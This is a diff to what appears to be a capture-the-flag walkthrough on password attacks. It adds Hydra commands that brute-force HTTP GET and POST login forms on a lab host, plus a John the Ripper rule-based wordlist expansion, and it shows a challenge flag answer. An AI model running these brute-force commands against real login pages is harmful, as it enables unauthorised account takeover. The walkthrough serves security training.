@@ -40,4 +40,37 @@ Answer is !multidisciplinary00
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+**Kali**
+
+```
+hydra -l phillips -P ../dict.lst 10.10.130.199 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+
+
+\
+**Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.130.199/login-post/. What is the flag?**
+
+**Note: use the clinic.lst dictionary in generating and expanding the wordlist!**
+
+
+
+**Kali**
+
+```
+john --wordlist=clinic.lst --rules=Single-Extra --stdout > dict2.lst
+
+./hydra -l burgess -P dict2.lst 10.10.130.199 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+```
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
